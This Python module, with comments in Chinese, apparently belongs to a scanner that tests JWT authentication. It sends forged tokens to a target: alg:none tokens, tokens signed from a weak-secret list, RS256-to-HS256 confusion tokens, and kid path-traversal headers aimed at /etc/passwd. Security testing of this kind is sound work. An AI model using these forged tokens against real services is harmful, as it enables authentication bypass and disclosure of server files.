"""JWT 安全测试模块 — 纯 Python 实现，无外部依赖"""

import base64
import hashlib
import hmac
import json
import logging
from typing import Optional

logger = logging.getLogger(__name__)


def _b64url_encode(data: bytes) -> str:
    """Base64url 编码（去除填充 =）"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    """Base64url 解码（自动补全填充）"""
    # 补全填充
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s)


def _hmac_sha256_sign(header_b64: str, payload_b64: str, secret: str) -> str:
    """用 HMAC-SHA256 对 JWT 签名"""
    message = f"{header_b64}.{payload_b64}".encode("utf-8")
    sig = hmac.new(
        secret.encode("utf-8"), message, hashlib.sha256
    ).digest()
    return _b64url_encode(sig)


def _create_jwt(header: dict, payload: dict, signature: str = "") -> str:
    """将 header + payload + signature 拼接为 JWT 字符串"""
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    if signature:
        return f"{header_b64}.{payload_b64}.{signature}"
    return f"{header_b64}.{payload_b64}."


WEAK_SECRETS = [
    "secret",
    "key",
    "password",
    "123456",
    "admin",
    "jwt_secret",
    "test",
    "secretkey",
    "private_key",
    "my_secret",
    "supersecret",
    "changeme",
    "pass",
    "token",
    "access_token",
    "jwt",
    "JWT_SECRET",
    "APP_SECRET",
]


class JWTTester:
    """JWT 安全测试器"""

    def __init__(self, config, target):
        self.config = config
        self.target = target
        self.findings: list[dict] = []
        self.weak_secrets = WEAK_SECRETS[:]

    async def run(self, client, jwt_token: str) -> list[dict]:
        """执行全部 JWT 测试

        Args:
            client: httpx.AsyncClient
            jwt_token: 原始 JWT 字符串

        Returns:
            发现列表 list[dict]
        """
        self.findings = []
        if not jwt_token or jwt_token.count(".") != 2:
            logger.warning("  [!] 无效的 JWT 格式，跳过测试")
            return []

        # 1. 解析 JWT
        decoded = self._decode_jwt(jwt_token)
        if not decoded:
            return []

        header = decoded["header"]
        payload = decoded["payload"]
        header_b64 = decoded["header_b64"]
        payload_b64 = decoded["payload_b64"]
        orig_alg = header.get("alg", "")

        base_url = self.target.base_url

        # 2. alg: none 绕过
        none_token = self._create_none_token(header, payload)
        none_result = await self._test_endpoint(client, base_url, none_token)
        if none_result and none_result.get("accepted", False):
            self.findings.append({
                "vuln_type": "jwt_alg_none",
                "url": base_url,
                "severity": "critical",
                "evidence": f"服务端接受了 alg:none 的 JWT: {none_token[:60]}...",
                "description": "JWT alg:none 绕过 — 服务端未验证签名算法，允许无签名JWT通过认证",
            })

        # 3. 弱密钥爆破
        for secret in self.weak_secrets:
            forged = self._try_secret(header_b64, payload_b64, secret)
            if not forged:
                continue
            result = await self._test_endpoint(client, base_url, forged)
            if result and result.get("accepted", False):
                self.findings.append({
                    "vuln_type": "jwt_weak_secret",
                    "url": base_url,
                    "severity": "high",
                    "evidence": f"弱密钥 '{secret}' 成功签名 JWT 并被服务端接受",
                    "description": f"JWT 弱密钥爆破 — 使用弱密钥 '{secret}' 成功伪造了有效的 JWT",
                })
                break  # 找到一个即可，不需要继续爆破

        # 4. 算法混淆 (RS256 → HS256)
        if orig_alg and "RS" in orig_alg.upper():
            # 尝试用 public key (如果有的话) 作为 HMAC 密钥
            public_key = self._get_public_key()
            if public_key:
                confused_token = self._try_secret(
                    header_b64, payload_b64, public_key,
                    override_alg="HS256",
                )
                if confused_token:
                    result = await self._test_endpoint(client, base_url, confused_token)
                    if result and result.get("accepted", False):
                        self.findings.append({
                            "vuln_type": "jwt_algorithm_confusion",
                            "url": base_url,
                            "severity": "critical",
                            "evidence": f"RS256→HS256 算法混淆成功，公钥作为HMAC密钥被接受",
                            "description": "JWT 算法混淆 — 服务端未区分 RS256/HS256，可用公钥作为HMAC密钥伪造JWT",
                        })

        # 5. Header 注入 (kid 路径遍历)
        injected_headers = [
            {"kid": "../../../etc/passwd"},
            {"kid": "../../../../etc/passwd"},
        ]
        for inj_header in injected_headers:
            modified_header = dict(header)
            modified_header.update(inj_header)
            # 保留原始算法，避免干扰
            forged = _create_jwt(modified_header, payload, signature="injected")
            result = await self._test_endpoint(client, base_url, forged)
            if result:
                resp = result.get("response")
                if resp:
                    body = resp.text
                    if "root:x:" in body or "root:x:0:0" in body:
                        self.findings.append({
                            "vuln_type": "jwt_kid_path_traversal",
                            "url": base_url,
                            "severity": "critical",
                            "evidence": f"kid 路径遍历成功，响应包含 /etc/passwd 内容",
                            "description": f"JWT Header 注入 — kid 参数存在路径遍历，可读取服务器文件",
                        })
                        break

        return self.findings

    def _decode_jwt(self, token: str) -> Optional[dict]:
        """解码 JWT (不验证签名)"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            header_b64, payload_b64, _ = parts
            header = json.loads(_b64url_decode(header_b64))
            payload = json.loads(_b64url_decode(payload_b64))
            return {
                "header": header,
                "payload": payload,
                "header_b64": header_b64,
                "payload_b64": payload_b64,
            }
        except Exception as e:
            logger.debug("  [!] JWT 解码失败: %s", e)
            return None

    def _create_none_token(self, header: dict, payload: dict) -> str:
        """创建 alg:none 的 JWT"""
        modified_header = dict(header)
        modified_header["alg"] = "none"
        return _create_jwt(modified_header, payload, signature="")

    def _try_secret(
        self, header_b64: str, payload_b64: str, secret: str,
        override_alg: Optional[str] = None,
    ) -> Optional[str]:
        """用指定 secret 签名，返回完整的 JWT 字符串"""
        try:
            # 重新编码 header (为可能的 alg 覆盖准备)
            if override_alg:
                # 需要重新生成 header_b64
                header_data = json.loads(_b64url_decode(header_b64))
                header_data["alg"] = override_alg
                new_header_b64 = _b64url_encode(
                    json.dumps(header_data, separators=(",", ":")).encode("utf-8")
                )
                sig = _hmac_sha256_sign(new_header_b64, payload_b64, secret)
                return f"{new_header_b64}.{payload_b64}.{sig}"
            else:
                sig = _hmac_sha256_sign(header_b64, payload_b64, secret)
                return f"{header_b64}.{payload_b64}.{sig}"
        except Exception as e:
            logger.debug("  [!] JWT 签名失败: %s", e)
            return None

    def _get_public_key(self) -> Optional[str]:
        """尝试获取公钥

        从 target 的配置中获取，或从 jwks.json 端点获取
        """
        # 先检查配置中是否有直接提供的公钥
        pubkey = self.config.get("jwt.public_key", "")
        if pubkey:
            return pubkey
        # 尝试常见的公钥端点
        for path in ["/.well-known/jwks.json", "/jwks.json", "/public.key", "/pubkey.pem"]:
            try:
                import httpx
                resp = httpx.get(f"{self.target.base_url.rstrip('/')}{path}", timeout=5)
                if resp.status_code == 200:
                    return resp.text
            except Exception:
                continue
        return None

    async def _test_endpoint(self, client, url: str, token: str) -> Optional[dict]:
        """测试 JWT 是否被服务端接受

        将 JWT 放在 Authorization header 中发送请求
        """
        try:
            resp = await client.get(
                url,
                headers={"Authorization": f"Bearer {token}"},
                follow_redirects=False,
                timeout=10,
            )
            # 如果返回 200 或不是 401/403，认为 JWT 被接受
            accepted = resp.status_code not in (401, 403) and resp.status_code < 500
            return {
                "accepted": accepted,
                "status_code": resp.status_code,
                "response": resp,
            }
        except Exception as e:
            logger.debug("  [!] JWT 端点测试失败: %s", e)
            return None
